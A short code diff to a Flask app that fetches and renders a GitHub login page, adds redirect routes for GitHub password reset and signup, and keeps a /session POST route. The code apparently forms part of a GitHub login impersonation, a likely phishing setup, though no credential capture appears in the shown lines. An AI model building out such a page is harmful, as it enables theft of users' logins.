@@ -16,7 +16,20 @@ app.secret_key = os.getenv("APP_SECRET_KEY")
 @app.route("/", methods=["GET"])
 def home():
     html_content = get_login_page()
+    with open("templates/response.html", "w", encoding="utf-8") as f:
+        f.write(html_content)
     return render_template("index.html", github_login=html_content)
+
+@app.route("/password_reset", methods=["GET"])
+def forgot_password():
+    return redirect("https://github.com/password_reset")
+
+@app.route("/signup", methods=["GET"])
+def signup():
+    source = request.args.get("source")
+    print(f"Redirecting to signup page from source: {source}")
+    return redirect("https://github.com/signup?source=login")
+
 
 @app.route("/session", methods=["POST"])
 def session():
